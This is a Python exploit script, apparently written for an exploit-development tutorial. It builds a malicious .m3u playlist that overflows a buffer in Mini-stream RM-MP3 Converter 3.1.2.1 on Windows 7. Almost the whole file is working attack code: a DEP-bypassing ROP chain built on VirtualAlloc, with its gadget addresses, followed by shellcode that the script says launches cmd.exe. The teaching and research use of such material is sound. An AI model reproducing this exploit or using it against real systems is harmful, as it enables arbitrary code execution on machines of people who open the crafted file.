#!/usr/bin/python

#----------------------------------------------------------------------------------#
# Exploit: Mini-stream RM-MP3 Converter 3.1.2.1 (*.m3u)                            #
# OS: Win7 Pro SP1                                                                 #
# Author: b33f (Ruben Boonen)                                                      #
# Software: http://www.exploit-db.com/wp-content/themes/exploit/applications       #
#          /ce47c348747cd05020b242da250c0da3-Mini-streamRM-MP3Converter.exe        #
#----------------------------------------------------------------------------------#
# This exploit was created for Part 7 of my Exploit Development tutorial           #
# series - http://www.fuzzysecurity.com/tutorials/expDev/7.html                    #
#----------------------------------------------------------------------------------#

from struct import pack
file="calc.m3u"

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#
rop = pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += pack('<L',0x10029b57) # POP EDI # RETN
rop += pack('<L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -> EDI]-#
rop += pack('<L',0x100280de) # POP ECX # RETN
rop += pack('<L',0xffffffff) # will become 0x40
rop += pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += pack('<L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -> ECX]-#
rop += pack('<L',0x1002ba02) # POP EAX # RETN
rop += pack('<L',0x1005d060) # kernel32.virtualalloc
rop += pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -> ESI]-#
rop += pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += pack('<L',0x41414141) # padding for POP EBP
rop += pack('<L',0x10013b1c) # POP EBX # RETN
rop += pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += pack('<L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -> EDX]-#
rop += pack('<L',0x100532ed) # POP EBP # RETN
rop += pack('<L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -> EBP]-#
rop += pack('<L',0x10013b1c) # POP EBX # RETN
rop += pack('<L',0xffffffff) # will be 0x1
rop += pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -> EBX]-#
rop += pack('<L',0x10030361) # POP EAX # RETN
rop += pack('<L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -> EAX]-#
rop += pack('<L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -> pwnd!]-#

# Start cmd.exe
calc = ( "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"+
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"+
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"+
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"+
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"+
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"+
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"+
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"+
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"+
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"+
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"+
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"+
    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"+
    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"+
    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"+
    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"+
    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"+
    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"+
    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"+
    "\x24\x20\x57\xFF\xD0")

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = "\x90"*5 + calc
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + shell + "C"*(7572-len(rop + shell))

writeFile = open(file, "w")
writeFile.write(crash)
writeFile.close()
